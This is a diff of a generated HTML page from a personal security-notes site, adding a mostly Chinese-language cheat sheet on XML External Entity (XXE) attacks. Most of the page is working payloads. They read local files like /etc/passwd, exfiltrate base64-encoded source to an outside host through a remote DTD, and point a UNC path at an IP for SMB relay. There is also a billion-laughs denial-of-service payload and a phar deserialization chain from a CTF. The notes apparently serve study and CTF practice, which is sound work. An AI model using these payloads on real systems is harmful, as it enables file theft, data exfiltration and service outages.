@@ -103,7 +103,7 @@
     <div class="Page__header">
         <h1><a href="../Web_Application_Attack/Misc.html">Web Application Attack</a> <svg class="Page__header--separator" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 477.175 477.175"><path d="M360.73 229.075l-225.1-225.1c-5.3-5.3-13.8-5.3-19.1 0s-5.3 13.8 0 19.1l215.5 215.5-215.5 215.5c-5.3 5.3-5.3 13.8 0 19.1 2.6 2.6 6.1 4 9.5 4 3.4 0 6.9-1.3 9.5-4l225.1-225.1c5.3-5.2 5.3-13.8.1-19z"/></svg> <a href="../Web_Application_Attack/XXE_(XML_External_Entity).html">XXE (XML External Entity)</a></h1>
                 <span class="ModifiedDate">
-            February 16, 2021 at 1:21 AM        </span>
+            February 16, 2021 at 1:22 AM        </span>
                         <span class="EditOn">
             <a href="https://github.com/WildfootW/Security-Note/blob/master/docs/120_Web_Application_Attack/100_XXE_(XML_External_Entity).md" target="_blank">
                 Edit on GitHub            </a>
@@ -111,7 +111,244 @@
             </div>
 
     <div class="s-content">
-            </div>
+        <h1 id="page_XXE_(XML_External_Entity)">XXE (XML External Entity)</h1>
+<div class="TableOfContentsContainer">
+    <h4 class="TableOfContentsContainer__title">Table of Contents</h4>
+    <div class="TableOfContentsContainer__content">
+        <ul class="TableOfContents">
+<li>
+<p><a href="#page_XXE_(XML_External_Entity)">XXE (XML External Entity)</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_tags">tags: <code>Security</code> <code>Web</code></a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_XML_Format">XML Format</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_nei_bu_shi_ti">內部實體</a></p>
+</li>
+<li>
+<p><a href="#page_wai_bu_shi_ti">外部實體</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_Leak_information">Leak information</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_can_shu_shi_ti">參數實體</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_Leak_information-2">Leak information</a></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_Test_XML">Test XML</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_php_simplexml_load_string()">php simplexml_load_string()</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_Attacks">Attacks</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_Blind">Blind</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_Error_based">Error-based</a></p>
+</li>
+<li>
+<p><a href="#page_Out_of_Band">Out of Band</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_XXE_+_SMBrelay_to_RCE">XXE + SMBrelay to RCE</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_Others">Others</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_DoS">DoS</a></p>
+</li>
+<li>
+<p><a href="#page_chuan_Phar_fan_xu_lie_hua">串 Phar 反序列化</a></p>
+</li>
+<li>
+<p><a href="#page_XXE_in_Files">XXE in Files</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_file_types">file types</a></p>
+</li>
+<li>
+<p><a href="#page_Tools">Tools</a></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>    </div>
+</div>
+<h6 id="page_tags">tags: <code>Security</code> <code>Web</code></h6>
+<h1 id="page_XML_Format">XML Format</h1>
+<pre><code>XML declaration:
+&lt;?xml version=&quot;1.0&quot; ?&gt;
+
+DTD(Document Type Definition):
+&lt;!DOCTYPE note [
+    &lt;!ELEMENT note (to, from, body)&gt;
+    &lt;!ELEMENT to   (#PCDATA)&gt;
+    &lt;!ELEMENT from (#PCDATA)&gt;
+    &lt;!ELEMENT body (#PCDATA)&gt;
+]&gt;
+
+Element:
+&lt;note&gt;
+&lt;to&gt;WildfootW&lt;/to&gt;
+&lt;from&gt;Oscar&lt;/from&gt;
+&lt;body&gt;Puta&lt;/body&gt;
+&lt;/note&gt;
+</code></pre>
+<ul>
+<li>DOCTYPE: DTD 聲明</li>
+<li>ENTITY: 實體聲明(類似變數)</li>
+<li>SYSTE、PUBLIC: 外部資源申請</li>
+</ul>
+<h2 id="page_nei_bu_shi_ti">內部實體</h2>
+<pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">wildfootw</span>[
+    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">param</span> <span class="hljs-meta-string">"hello"</span>&gt;</span>
+]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;param;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span>
+</code></pre>
+<h2 id="page_wai_bu_shi_ti">外部實體</h2>
+<pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">wildfootw</span>[
+    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">"http://wildfoo.tw/xxe.txt"</span>&gt;</span>
+]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span>
+</code></pre>
+<h3 id="page_Leak_information">Leak information</h3>
+<pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">wildfootw</span>[
+    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">"file:///etc/passwd"</span>&gt;</span>
+]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span>
+</code></pre>
+<ul>
+<li>
+<code>libxml2.9.0</code>以後，預設不解析外部實體</li>
+<li>
+<code>simplexml_load_file()</code>舊版本中預設解析實體，但新版要指定第三個參數<code>LIBXML_NOENT</code>
+</li>
+<li>
+<code>SimpleXMLElement</code> is a class in PHP
+<ul>
+<li>http://php.net/manual/en/class.simplexmlelement.php</li>
+</ul>
+</li>
+</ul>
+<h2 id="page_can_shu_shi_ti">參數實體</h2>
+<h3 id="page_Leak_information-2">Leak information</h3>
+<pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">kaibro</span>[
+    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">remote</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">"http://wildfoo.tw/xxe.dtd"</span>&gt;</span>
+    %remote;
+]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;b;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span>
+</code></pre>
+<p><code>xxe.dtd</code>:</p>
+<pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY b <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">"file:///etc/passwd"</span>&gt;</span>
+</code></pre>
+<h1 id="page_Test_XML">Test XML</h1>
+<h2 id="page_php_simplexml_load_string()">php simplexml_load_string()</h2>
+<p><code>apt install php7.3-xml</code></p>
+<pre><code>$data = &lt;&lt;&lt;EOF
+&lt;!DOCTYPE wildfootw[
+  &lt;!ENTITY param &quot;hello world&quot;&gt;
+]&gt;
+&lt;root&gt;&amp;param;&lt;/root&gt;
+EOF;
+echo simplexml_load_string($data);
+</code></pre>
+<h1 id="page_Attacks">Attacks</h1>
+<h2 id="page_Blind">Blind</h2>
+<h3 id="page_Error_based">Error-based</h3>
+<p><a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/" class="Link--external" rel="noopener noreferrer">mohemiv</a></p>
+<h3 id="page_Out_of_Band">Out of Band</h3>
+<pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version="1.0"?&gt;</span>
+<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">ANY</span>[
+<span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">"php://filter/convert.base64-encode/resource=/www/index.php"</span>&gt;</span>
+<span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">remote</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">"http://wildfoo.tw/xxe.dtd"</span>&gt;</span>
+%remote;
+%all;
+%send;
+]&gt;</span>
+</code></pre>
+<p><code>xxe.dtd</code>:</p>
+<pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">all</span> <span class="hljs-meta-string">"&lt;!ENTITY &amp;#37; send SYSTEM 'http://wildfoo.tw/?x=%file;'&gt;"</span>&gt;</span>
+</code></pre>
+<h2 id="page_XXE_+_SMBrelay_to_RCE">XXE + SMBrelay to RCE</h2>
+<p><a href="https://medium.com/@canavaroxum/xxe-on-windows-system-then-what-76d571d66745" class="Link--external" rel="noopener noreferrer">medium</a></p>
+<pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">kaibro</span>[
+    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">"\\12.34.56.78"</span>&gt;</span>
+]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span>
+</code></pre>
+<h1 id="page_Others">Others</h1>
+<h2 id="page_DoS">DoS</h2>
+<ul>
+<li>Billion Laugh Attack</li>
+</ul>
+<pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">data</span> [
+<span class="hljs-meta">&lt;!ENTITY a0 <span class="hljs-meta-string">"dos"</span> &gt;</span>
+<span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">a1</span> <span class="hljs-meta-string">"&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;"</span>&gt;</span>
+<span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">a2</span> <span class="hljs-meta-string">"&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;"</span>&gt;</span>
+<span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">a3</span> <span class="hljs-meta-string">"&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;"</span>&gt;</span>
+<span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">a4</span> <span class="hljs-meta-string">"&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;"</span>&gt;</span>
+]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span>&amp;a4;<span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span>
+</code></pre>
+<h2 id="page_chuan_Phar_fan_xu_lie_hua">串 Phar 反序列化</h2>
+<pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version="1.0" standalone="yes"?&gt;</span>
+<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">ernw</span> [ 
+    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">"phar:///var/www/html/images/gginin/xxxx.jpeg"</span> &gt;</span> ]&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"500px"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"100px"</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://www.w3.org/2000/svg"</span> <span class="hljs-attr">xmlns:xlink</span>=<span class="hljs-string">"http://www.w3.org/1999/xlink"</span> <span class="hljs-attr">version</span>=<span class="hljs-string">"1.1"</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">text</span> <span class="hljs-attr">font-family</span>=<span class="hljs-string">"Verdana"</span> <span class="hljs-attr">font-size</span>=<span class="hljs-string">"16"</span> <span class="hljs-attr">x</span>=<span class="hljs-string">"10"</span> <span class="hljs-attr">y</span>=<span class="hljs-string">"40"</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span>
+</code></pre>
+<ul>
+<li>Example: MidnightSun CTF - Rubenscube</li>
+</ul>
+<h2 id="page_XXE_in_Files">XXE in Files</h2>
+<ul>
+<li>
+<a href="https://www.youtube.com/watch?v=LZUlw8hHp44" class="Link--external" rel="noopener noreferrer">Black hat 2015 video</a>
+</li>
+</ul>
+<h3 id="page_file_types">file types</h3>
+<ul>
+<li>DOCX</li>
+<li>XLSX</li>
+<li>PPTX</li>
+<li>PDF</li>
+</ul>
+<h3 id="page_Tools">Tools</h3>
+<ul>
+<li>
+<a href="https://github.com/BuffaloWill/oxml_xxe" class="Link--external" rel="noopener noreferrer">OXML_XXE</a>
+</li>
+<li>
+<a href="https://github.com/whitel1st/docem" class="Link--external" rel="noopener noreferrer">DOCEM</a>
+</li>
+</ul>
+    </div>
 
         <nav>
         <ul class="Pager">
